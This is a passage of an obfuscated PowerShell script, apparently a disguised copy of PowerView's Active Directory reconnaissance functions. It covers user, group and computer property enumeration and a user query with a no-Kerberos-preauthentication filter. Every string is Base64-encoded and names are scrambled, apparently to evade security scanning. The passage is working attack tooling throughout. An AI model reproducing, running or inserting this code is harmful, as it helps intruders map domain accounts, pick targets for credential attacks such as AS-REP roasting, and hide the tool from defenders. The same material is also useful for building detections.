        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/=\_____/\__/=\_} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${___/\/\/======\__} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${/===\/\__/\/==\/\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${/==\___/\/=\/=\__} = __/\/\__/=\/\/\/\/ -Domain $Domain | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            else {
                ${/==\___/\/=\/=\__} = __/\/\__/=\/\/\/\/ -Domain $Domain -Credential $Credential | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAbgB1AG0AZQByAGEAdABlAGQAIABmAG8AcgBlAHMAdAAgACcAJAB7AC8APQA9AFwAXwBfAF8ALwBcAC8APQBcAC8APQBcAF8AXwB9ACcAIABmAG8AcgAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwA=')))
        }
        ${/=\___/\/\/\__/==} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/\/\/\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if (${/==\___/\/=\/=\__}) {
            ${/=\___/\/\/\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = ${/==\___/\/=\/=\__}
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkACAALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
            ${_/=\/\/\/=\_/====} = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAGUAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            ${_/=\/\/\/=\_/====} = gm -InputObject $ReferenceObject -MemberType NoteProperty | select -Expand Name
            ${/=======\__/====\} = $ReferenceObject.objectclass | select -Last 1
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEMAYQBsAGMAdQBsAGEAdABlAGQAIABSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdABDAGwAYQBzAHMAIAA6ACAAJAB7AC8APQA9AD0APQA9AD0APQBcAF8AXwAvAD0APQA9AD0AXAB9AA==')))
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAHIAZQBmAGUAcgBlAG4AYwBlACAAcAByAG8AcABlAHIAdAB5ACAAcwBlAHQAIABmAG8AcgAgAHQAaABlACAAbwBiAGoAZQBjAHQAIABjAGwAYQBzAHMAIAAnACQAQwBsAGEAcwBzAE4AYQBtAGUAJwA=')))
        }
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or (${/=======\__/====\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            ${/====\___/\/===\_} = ____/\/====\/\___/ @_/\/\/\/\___/\/\/
            if (-not ${_/=\/\/\/=\_/====}) {
                ${_/=\/\/\/=\_/====} = ${_/=\_____/\__/=\_}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or (${/=======\__/====\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            ${/====\___/\/===\_} = __/\_/\/\__/==\/\_ @_/\/\/\/\___/\/\/
            if (-not ${_/=\/\/\/=\_/====}) {
                ${_/=\/\/\/=\_/====} = ${___/\/\/======\__}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or (${/=======\__/====\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            ${/====\___/\/===\_} = __/\/\/=\/\_/==\/\ @_/\/\/\/\___/\/\/
            if (-not ${_/=\/\/\/=\_/====}) {
                ${_/=\/\/\/=\_/====} = ${/===\/\__/\/==\/\}
            }
        }
        else {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEkAbgB2AGEAbABpAGQAIABjAGwAYQBzAHMAOgAgACQAQwBsAGEAcwBzAE4AYQBtAGUA')))
        }
        ForEach ($Object in ${/====\___/\/===\_}) {
            ${____/====\____/=\} = gm -InputObject $Object -MemberType NoteProperty | select -Expand Name
            ForEach(${_______/=\/=\/\/=} in ${____/====\____/=\}) {
                if (${_/=\/\/\/=\_/====} -NotContains ${_______/=\/=\/\/=}) {
                    ${/==\/===\__/\___/} = New-Object PSObject
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Object.SamAccountName
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdAB5AA=='))) ${_______/=\/=\/\/=}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.${_______/=\/=\/\/=}
                    ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcgA='))))
                    ${/==\/===\__/\___/}
                }
            }
        }
    }
}
function ____/\/====\/\___/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [Switch]
        ${__/===\______/=\/\},
        [Switch]
        ${_/=\_/=\___/=\_/\_},
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${__/\_/==\/\_/=\___},
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${__/\_/==\/\_/\_/\_},
        [Switch]
        ${___/\/=\/\/\/\____},
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${__/\/==\_/\_/\___/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${_/=\_/===\_/=\/==} = [Enum]::GetNames(${/=\____/\/===\/\_})
        ${_/=\_/===\_/=\/==} = ${_/=\_/===\_/=\/==} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/===\_/\/\/\/==\_ -Name UACFilter -ValidateSet ${_/=\_/===\_/=\/==} -__/==\/\/=\__/=\__ ([array])
    }
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
